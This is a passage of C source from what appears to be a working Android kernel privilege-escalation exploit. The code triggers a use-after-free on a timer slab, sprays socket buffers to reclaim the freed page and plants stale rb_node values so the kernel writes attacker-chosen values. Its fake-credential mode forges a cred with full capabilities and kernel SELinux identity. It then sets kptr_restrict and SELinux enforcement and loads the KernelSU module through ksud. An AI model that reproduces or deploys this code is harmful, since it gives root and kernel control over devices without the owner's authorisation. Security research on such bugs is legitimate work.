 * @brief Stop a not-yet-released target and every CLONE_VM helper it owns.
 * @param pid Target process and process-group id established after fork.
 * @return No value; the direct target is synchronously reaped.
 * @note The separate locker/killer helpers inherit the target process group;
 *       killing only the leader would orphan helpers that retain the adb pipe.
 * @note Stage: bounded pre-trigger cancellation before a stale node can exist.
 */
static void terminate_target_tree(pid_t pid)
{
    (void)kill(-pid, SIGKILL);
    (void)kill(pid, SIGKILL);
    (void)waitpid(pid, NULL, 0);
}

/**
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   ptr: parent=node -> rb_erase writes node to target.  The KernelSU route
 *        accepts only node values whose CAP_SYS_MODULE bit is set.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + GLK98260_RB_PARENT_COLOR_OFF) = parent;
    *(unsigned long long *)(buf + off + GLK98260_RB_LEFT_OFF) = target;
}

/**
 * @brief Copy the manager's ksud executable to a stable shell-owned path.
 * @return Zero only when the copied loader exists and is non-empty.
 * @note The preparation process runs with ordinary shell credentials; the
 *       capability-bearing child later execs this exact loader with ambient
 *       CAP_SYS_MODULE so ksud can perform its kallsyms-aware module load.
 * @note Stage: non-destructive KSU asset preparation before stale-node plants.
 */
static int prepare_ksud(void)
{
    static const char script[] =
        "#!/system/bin/sh\n"
        "set -e\n"
        "PKG=me.weishu.kernelsu\n"
        "APK=$(pm path \"$PKG\" 2>/dev/null | head -1 | cut -d: -f2)\n"
        "KSUD=''\n"
        "if [ -n \"$APK\" ]; then "
        "KSUD=\"$(dirname \"$APK\")/lib/arm64/libksud.so\"; fi\n"
        "[ -x \"$KSUD\" ] || KSUD=$(find /data/app -path "
        "'*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
        "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
        "[ -x \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud\n"
        "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; exit 1; fi\n"
        "echo \"[ksu] ksud=$KSUD version=$(\"$KSUD\" --version 2>&1 | head -1)\"\n"
        "cat \"$KSUD\" > " GLK98260_KSUD_PATH "\n"
        "chmod 0755 " GLK98260_KSUD_PATH "\n"
        "echo \"[ksu] prepared path=" GLK98260_KSUD_PATH
        " bytes=$(wc -c < " GLK98260_KSUD_PATH ")\"\n";
    int fd = open(GLK98260_KSU_PREPARE_SCRIPT_PATH,
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);
    struct stat st;
    int status = 0;
    pid_t child;

    if (fd < 0)
        return -1;
    if (write(fd, script, sizeof(script) - 1) !=
        (ssize_t)(sizeof(script) - 1))
    {
        close(fd);
        return -1;
    }
    close(fd);
    (void)chmod(GLK98260_KSU_PREPARE_SCRIPT_PATH, 0755);
    child = fork();
    if (child == 0)
    {
        char *const av[] = {(char *)"sh",
                            (char *)GLK98260_KSU_PREPARE_SCRIPT_PATH, NULL};
        char *const ep[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        execve("/system/bin/sh", av, ep);
        _exit(127);
    }
    if (child < 0 || waitpid(child, &status, 0) != child ||
        !WIFEXITED(status) || WEXITSTATUS(status) != 0 ||
        stat(GLK98260_KSUD_PATH, &st) != 0 || st.st_size <= 0)
    {
        logf("[-] KSU loader preparation failed status=%#x errno=%d\n",
             status, errno);
        return -1;
    }
    logf("[ksu] loader prepared bytes=%lld\n", (long long)st.st_size);
    return 0;
}

/**
 * @brief Check whether the KernelSU LKM is present in the live module list.
 * @return One when a kernelsu record is visible, otherwise zero.
 * @note Stage: post-ksud readback before reporting KSU success.
 */
static int kernelsu_module_loaded(void)
{
    char line[256];
    FILE *f = fopen("/proc/modules", "r");

    if (!f)
        return 0;
    while (fgets(line, sizeof(line), f))
    {
        if (!strncmp(line, "kernelsu ", 9))
        {
            fclose(f);
            return 1;
        }
    }
    fclose(f);
    return 0;
}

/**
 * @brief Restore SELinux enforcing after the ksud module load.
 * @return Zero only when the enforce byte is written and reads back as one.
 * @note The caller is already uid/gid zero and retains ambient capability
 *       across the worker exec before this cleanup step.
 * @note Stage: KSU cleanup after the module-presence readback.
 */
static int restore_selinux_enforcing(void)
{
    char value = '0';
    int fd = open("/sys/fs/selinux/enforce", O_WRONLY);

    if (fd < 0 || write(fd, "1", 1) != 1)
    {
        if (fd >= 0)
            close(fd);
        return -1;
    }
    close(fd);
    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0 || read(fd, &value, 1) != 1)
    {
        if (fd >= 0)
            close(fd);
        return -1;
    }
    close(fd);
    return value == '1' ? 0 : -1;
}

/**
 * @brief Read the live kernel pointer-display policy.
 * @return The numeric kptr_restrict value, or -1 when it cannot be read.
 * @note Stage: KSU loader preparation after uid/gid and capability promotion.
 */
static int read_kptr_restrict(void)
{
    FILE *f = fopen(GLK98260_KPTR_RESTRICT_PATH, "r");
    int value = -1;

    if (!f)
        return -1;
    if (fscanf(f, "%d", &value) != 1)
        value = -1;
    fclose(f);
    return value;
}

/**
 * @brief Set and read back the kernel pointer-display policy.
 * @param value Numeric kptr_restrict value to publish through procfs.
 * @return Zero only when the write succeeds and the same value reads back.
 * @note The caller must have uid zero and must run while SELinux is permissive.
 * @note Stage: bounded KSU loader setup or cleanup outside the stale-node window.
 */
static int set_kptr_restrict(int value)
{
    char text[16];
    int len = snprintf(text, sizeof(text), "%d\n", value);
    int fd;

    if (len <= 0 || (size_t)len >= sizeof(text))
        return -1;
    fd = open(GLK98260_KPTR_RESTRICT_PATH, O_WRONLY);
    if (fd < 0 || write(fd, text, (size_t)len) != len)
    {
        if (fd >= 0)
            close(fd);
        return -1;
    }
    close(fd);
    return read_kptr_restrict() == value ? 0 : -1;
}

static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

/**
 * @brief Read one hexadecimal capability field from a blocked child status.
 * @param pid Credential child process id.
 * @param field Status key without the trailing colon, such as CapEff.
 * @return Parsed value, or zero when the proc record cannot be verified.
 * @note The child remains blocked on its command pipe throughout this read.
 * @note Stage: verify the real-cred CAP_SYS_MODULE pointer plant before KSU.
 */
static unsigned long long read_child_status_hex(pid_t pid, const char *field)
{
    char path[64], line[256];
    size_t field_len = strlen(field);
    unsigned long long value = 0;
    FILE *f;

    (void)snprintf(path, sizeof(path), "/proc/%d/status", pid);
    f = fopen(path, "r");
    if (!f)
        return 0;
    while (fgets(line, sizeof(line), f))
    {
        if (strncmp(line, field, field_len) != 0 || line[field_len] != ':')
            continue;
        if (sscanf(line + field_len + 1, "%llx", &value) != 1)
            value = 0;
        break;
    }
    fclose(f);
    return value;
}

/**
 * @brief Verify the post-exec capability sets and enter ksud late-load.
 * @return Does not return on success; returns a nonzero diagnostic on failure.
 * @note The first exec converts Ambient CAP_SYS_MODULE into Effective.  A
 *       second ordinary exec into ksud retains the same ambient capability.
 * @note Stage: KSU loader boundary after the real-cred write sequence.
 */
static int ksu_worker_main(void)
{
    unsigned long long cap_amb = read_child_status_hex(getpid(), "CapAmb");
    unsigned long long cap_eff = read_child_status_hex(getpid(), "CapEff");
    unsigned long long cap_inh = read_child_status_hex(getpid(), "CapInh");
    unsigned long long cap_prm = read_child_status_hex(getpid(), "CapPrm");
    int kptr_restrict = read_kptr_restrict();
    char *const av[] = {
        (char *)GLK98260_KSUD_PATH, (char *)"late-load",
        (char *)"--kmi", (char *)GLK98260_KSU_KMI,
        (char *)"--allow-shell", (char *)"--package-name",
        (char *)"me.weishu.kernelsu", NULL};
    char *const ep[] = {
        (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
        (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
        (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
        NULL};

    logf("[ksu-worker] CapInh=%#llx CapPrm=%#llx CapEff=%#llx "
         "CapAmb=%#llx kptr_restrict=%d\n",
         cap_inh, cap_prm, cap_eff, cap_amb, kptr_restrict);
    if (!(cap_inh & GLK98260_CAP_SYS_MODULE_MASK) ||
        !(cap_prm & GLK98260_CAP_SYS_MODULE_MASK) ||
        !(cap_eff & GLK98260_CAP_SYS_MODULE_MASK) ||
        !(cap_amb & GLK98260_CAP_SYS_MODULE_MASK) ||
        kptr_restrict != GLK98260_KPTR_RESTRICT_VISIBLE)
        return 4;
    execve(GLK98260_KSUD_PATH, av, ep);
    logf("[-] ksud exec failed errno=%d\n", errno);
    return 127;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw);
static void drain_pool(void);

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out)
{
    struct plant_res r;

    for (unsigned attempt = 1;
         attempt <= GLK98260_STAGE_WRITE_ATTEMPTS; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%u\n", what, target,
             mode == 2 ? "fake" : (mode == 1 ? "ptr" : "zero"), attempt);
        run_plant(target, 1, mode, &r, raw);
        if (mode != 2 && r.retry)
            drain_pool();
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS GLK98260_SPRAY_THREADS
#define SPRAY_SOCKS GLK98260_SPRAY_SOCKS
#define SPRAY_PRE GLK98260_SPRAY_PRE_WRITES
#define SPRAY_POST GLK98260_SPRAY_POST_WRITES
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_pool_sndbuf_min;
static int g_rawfd[GLK98260_TRACE_CPU_COUNT] = {
    -1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int sock_first, sock_count, cpu, idx;
};

static int ensure_pool(void)
{
    int snd = 16 << 20;
    unsigned stages = g_fake_stage ? GLK98260_FAKE_WRITE_STAGE_COUNT
                                   : GLK98260_REAL_WRITE_STAGE_COUNT;

    if (g_pool_n)
        return 0;
    g_pool_sndbuf_min = INT32_MAX;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        int actual = 0;
        socklen_t actual_len = sizeof(actual);

        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        if (setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd,
                       sizeof(snd)) ||
            setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd,
                       sizeof(snd)) ||
            getsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &actual,
                       &actual_len) ||
            actual_len != sizeof(actual) ||
            fcntl(g_pool[i][1], F_SETFL,
                  fcntl(g_pool[i][1], F_GETFL) | O_NONBLOCK) != 0)
            break;
        if (actual < g_pool_sndbuf_min)
            g_pool_sndbuf_min = actual;
        g_pool_n++;
    }
    if (g_pool_n != SPRAY_SOCKS || g_pool_n % SPRAY_THREADS)
    {
        logf("[-] spray pool incomplete sockets=%d/%d\n", g_pool_n,
             SPRAY_SOCKS);
        return -1;
    }
    {
        unsigned long long writes = (unsigned long long)SPRAY_PRE + SPRAY_POST;
        unsigned long long sockets_per_thread =
            (unsigned long long)g_pool_n / SPRAY_THREADS;
        unsigned long long per_socket =
            (writes + sockets_per_thread - 1ULL) / sockets_per_thread;
        unsigned long long required =
            per_socket * SOCKBUF * stages * GLK98260_SOCKET_ACCOUNTING_FACTOR;

        logf("[pool] sockets=%d sndbuf_min=%d required=%llu stages=%u\n",
             g_pool_n, g_pool_sndbuf_min, required, stages);
        if ((unsigned long long)g_pool_sndbuf_min < required)
            return -1;
    }
    return 0;
}

/**
 * @brief Release socket payloads after a clean-retry plant.
 * @return No value; every receiver is drained until it would block.
 * @note A retry has no stale node.  Successful stages retain their payloads
 *       to preserve the allocator pressure accounted by the stage preflight;
 *       draining them disturbed later buddy-page selection on this AVD.
 * @note Stage: bounded retry cleanup between independent write attempts.
 */
static void drain_pool(void)
{
    unsigned char buffer[16384];
    unsigned long long bytes = 0;

    for (int i = 0; i < g_pool_n; i++)
    {
        ssize_t n;

        do
        {
            n = read(g_pool[i][1], buffer, sizeof(buffer));
            if (n > 0)
                bytes += (unsigned long long)n;
        } while (n > 0);
    }
    logf("[pool] drained=%llu\n", bytes);
}

static int ensure_raw(void)
{
    for (int cpu = 0; cpu < GLK98260_TRACE_CPU_COUNT; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
        if (g_rawfd[cpu] < 0)
        {
            logf("[-] raw trace open failed cpu=%d errno=%d\n", cpu, errno);
            return -1;
        }
    }
    return 0;
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * A page_alloc for the victim pfn is only a hit if one of our spray threads
 * performed it.  A system allocation can take the freed page first; reaping
 * that node would treat the system page contents as an rb_node and panic.
 */
static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += GLK98260_TRACE_SCAN_STRIDE)
    {
        int pid;

        if (u64(b, i) != pfn ||
            (int)u32(b, i + GLK98260_TRACE_PAGE_ORDER_AFTER_PFN) !=
                (int)GLK98260_TIMER_SLAB_ORDER)
            continue;
        if ((u32(b, i - GLK98260_TRACE_PAGE_TYPE_BEFORE_PFN) & 0xffff) !=
            g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - GLK98260_TRACE_PAGE_PID_BEFORE_PFN);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
                return 1;
    }
    return 0;
}

/**
 * @brief Hold the selected socket payload across the two reclaim bursts.
 * @param x Pointer to the immutable socket range and payload for this worker.
 * @return NULL after both bursts or after the parent requests cancellation.
 * @note Cancellation is checked at every wait boundary so an exec-success
 *       retry cannot deadlock while joining workers that never saw burst one.
 * @note Stage: controlled order-1 reclaim after the target trigger exits.
 */
static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
        sched_yield();
    if (atomic_load(&g_stop_spray))
        return NULL;
    /* Phase 1 runs before the target execs; it catches an early free. */
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    int spray_created = 0;
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T == 0)
    {
        if (setpgid(0, 0) != 0)
            _exit(116);
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    (void)setpgid(T, T);
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        terminate_target_tree(T);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        terminate_target_tree(T);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (base != GLK98260_EXPECTED_PFN_TO_VIRT_BASE)
        {
            trace_stop();
            terminate_target_tree(T);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * Valid direct-map pointers remain inside the compile-time VA window;
         * g_base is the separately checked PFN-to-virtual conversion base.
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= GLK98260_DIRECT_MAP_MIN &&
                ptrs[i] < GLK98260_DIRECT_MAP_MAX)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        terminate_target_tree(T);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~GLK98260_TIMER_SLAB_MASK;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~GLK98260_TIMER_SLAB_MASK) == vslab)
            slab_own++;
    pfn = (V - g_base) >> GLK98260_PAGE_SHIFT;
    slab_pfn = pfn & ~GLK98260_TIMER_SLAB_PFN_MASK;
    if (site0 < STATIC_TIMER_SITE)
    {
        trace_stop();
        terminate_target_tree(T);
        logf("[-] plant%d timer site underflow site=%#llx static=%#llx\n",
             tag, site0, STATIC_TIMER_SITE);
        return;
    }
    g_slide = site0 - STATIC_TIMER_SITE;
    g_slide_ready = 1;

    {
        size_t off = (size_t)((V & GLK98260_TIMER_SLAB_MASK) +
                              GLK98260_TIMER_NODE_OFF);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            terminate_target_tree(T);
            return;
        }
        if (mode == 1)
        {
            unsigned long long node = V + GLK98260_TIMER_NODE_OFF;

            if (!(node & GLK98260_CAP_SYS_MODULE_MASK))
            {
                logf("[-] plant%d ptr=%#llx lacks CAP_SYS_MODULE bit; retryable\n",
                     tag, node);
                terminate_target_tree(T);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            build_payload(payload, off, node, target);
            logf("[+] plant%d capability pointer=%#llx mask=%#llx\n",
                 tag, node, GLK98260_CAP_SYS_MODULE_MASK);
        }
        else if (mode == 2)
        {
            unsigned long long page = V & ~GLK98260_TIMER_SLAB_MASK;
            unsigned long long node = V + GLK98260_TIMER_NODE_OFF;
            unsigned char *cred = payload + off;
            size_t blob = 0;
            const size_t cand[] = {
                GLK98260_SECURITY_BLOB_CANDIDATE_0,
                GLK98260_SECURITY_BLOB_CANDIDATE_1,
                GLK98260_SECURITY_BLOB_CANDIDATE_2,
                GLK98260_SECURITY_BLOB_CANDIDATE_3,
                GLK98260_SECURITY_BLOB_CANDIDATE_4,
                GLK98260_SECURITY_BLOB_CANDIDATE_5};
            int fit = 0;
            uint32_t usage = (uint32_t)node;

            if (usage < GLK98260_REFCOUNT_MIN ||
                usage > GLK98260_REFCOUNT_MAX)
            {
                logf("[-] plant%d fake usage=%#x outside refcount range; retryable\n",
                     tag, usage);
                terminate_target_tree(T);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            if (off + GLK98260_CRED_OBJECT_REQ > GLK98260_TIMER_SLAB_BYTES)
            {
                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                     tag, off);
                terminate_target_tree(T);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + GLK98260_SECURITY_BLOB_RESERVE >
                    GLK98260_TIMER_SLAB_BYTES)
                    continue;
                if (b + GLK98260_SECURITY_BLOB_RESERVE <= off ||
                    off + GLK98260_CRED_OBJECT_REQ <= b)
                {
                    blob = b;
                    fit = 1;
                    break;
                }
            }
            if (!fit)
            {
                terminate_target_tree(T);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            build_payload(payload, off, node, target);
            /* rb_parent_color overlays usage+uid; rb_left overlays sgid+euid.
             * Separate zero stages repair uid/gid and sgid/euid after erase. */
            *(unsigned int *)(cred + GLK98260_CRED_SECUREBITS_OFF) = 0;
            for (unsigned i = 0; i < GLK98260_CRED_CAPS_COUNT; i++)
                *(unsigned long long *)(cred + GLK98260_CRED_CAPS_OFF +
                                        (size_t)i * sizeof(unsigned long long)) =
                    FULLCAP;
            *(unsigned long long *)(cred + GLK98260_CRED_SECURITY_OFF) =
                page + blob; /* security */
            *(unsigned long long *)(cred + GLK98260_CRED_USER_OFF) =
                ROOT_USER_STATIC + g_slide;
            *(unsigned long long *)(cred + GLK98260_CRED_USER_NS_OFF) =
                INIT_USER_NS_STATIC + g_slide;
            *(unsigned long long *)(cred + GLK98260_CRED_UCOUNTS_OFF) =
                INIT_UCOUNTS_STATIC + g_slide;
            *(unsigned long long *)(cred + GLK98260_CRED_GROUP_INFO_OFF) =
                INIT_GROUPS_STATIC + g_slide;
            *(unsigned int *)(payload + blob + GLK98260_SECURITY_OSID_OFF) =
                SELINUX_SID_KERNEL;
            *(unsigned int *)(payload + blob + GLK98260_SECURITY_SID_OFF) =
                SELINUX_SID_KERNEL;
            logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx usage=%#x\n",
                 tag, off, blob, page + blob, usage);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx "
             "recs=%d slab_own=%d/%u base=%#llx\n",
             tag, V, V + GLK98260_TIMER_NODE_OFF, pfn, slab_pfn, g_slide,
             nrec, slab_own, GLK98260_TIMER_OBJECTS_PER_SLAB,
             g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = g_pool_n / SPRAY_THREADS;

        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            if (pthread_create(&th[i], NULL, spray_thread, &args[i]))
            {
                atomic_store(&g_stop_spray, 1);
                atomic_store(&g_burst, 1);
                atomic_store(&g_burst2, 1);
                for (int j = 0; j < spray_created; j++)
                    pthread_join(th[j], NULL);
                trace_stop();
                logf("[-] plant%d spray thread create failed at %d; holding target\n",
                     tag, i);
                g_held++;
                free(payload);
                return;
            }
            spray_created++;
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < spray_created; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        logf("[-] plant%d no zombie; holding child\n", tag);
        g_held++;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
    if (si.si_code != CLD_KILLED && si.si_code != CLD_DUMPED)
#else
    if (si.si_code != CLD_KILLED || si.si_status != SIGKILL)
#endif
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < spray_created; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d unexpected reap status; holding zombie\n", tag);
        g_held++;
        return;
    }
#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
    if (si.si_code == CLD_DUMPED && si.si_status != SIGSEGV)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < spray_created; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        logf("[-] plant%d unexpected coredump signal=%d; holding zombie\n",
             tag, si.si_status);
        g_held++;
        return;
    }
#endif
    atomic_store(&g_burst, 1);
    /*
     * Phase 1 is already spraying.  When the victim page is freed, release
     * phase 2 immediately; detecting the free before the allocation would
     * otherwise leave the page to the next caller.
     */
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < GLK98260_TRACE_CPU_COUNT && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
            }
            else if (!free_seen &&
                     scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                atomic_store(&g_burst2, 1);
            }
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < spray_created; i++)
        pthread_join(th[i], NULL);
    trace_stop();
    for (int cpu = 0; cpu < GLK98260_TRACE_CPU_COUNT && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            hit = 1;
    }
    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
         tag, free_seen, hit, now_ms() - t1);
    if (!hit)
    {
        logf("[-] plant%d burst missed; holding zombie\n", tag);
        g_held++;
        return;
    }

    usleep(1000);
    int st = 0;
    waitpid(T, &st, 0);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->A = V + GLK98260_TIMER_NODE_OFF;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : (mode == 1 ? "ptr" : "zero"), target);
    free(payload);
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
